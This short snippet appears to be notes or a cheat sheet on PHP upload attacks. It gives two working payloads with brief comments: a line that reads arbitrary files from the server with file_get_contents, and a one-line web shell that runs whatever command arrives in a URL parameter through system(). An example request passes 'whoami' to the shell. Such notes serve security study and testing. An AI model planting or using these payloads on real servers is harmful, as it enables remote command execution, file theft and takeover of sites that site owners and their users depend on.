<!-- Used to read arbitrary files from the server's filesystem -->
<?php echo file_get_contents('/path/to/target/file'); ?> 

<!-- These are used together, the command is attached in the parameter
 the php script executes that command -->
<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=whoami HTTP/1.1
